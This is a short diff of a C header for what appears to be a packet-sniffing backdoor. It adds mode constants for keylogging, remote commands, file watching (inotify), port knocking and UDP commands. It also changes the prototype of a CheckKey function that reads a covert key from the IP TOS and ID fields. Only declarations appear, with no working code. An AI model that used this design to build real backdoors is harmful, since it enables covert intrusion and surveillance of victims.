@@ -38,6 +38,13 @@
 #define PORTS "port"
 #define FILTERAMOUNT 2
 
+//check key returns
+#define KEYLOGGER       1
+#define COMMAND         2
+#define INOTIFY         3
+#define PORTKNOCKING    4
+#define UDPCOMMAND      5
+
 struct my_ip {
 	u_int8_t	ip_vhl;		/* header length, version */
 #define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
@@ -121,7 +128,7 @@ void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_c
 void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(struct filter *Filter, const unsigned char *tcp_payload);
-bool CheckKey(u_char ip_tos, u_short ip_id, bool knock);
+int CheckKey(u_char ip_tos, u_short ip_id);
 pcap_t *interfaceinfo;
 
 #endif
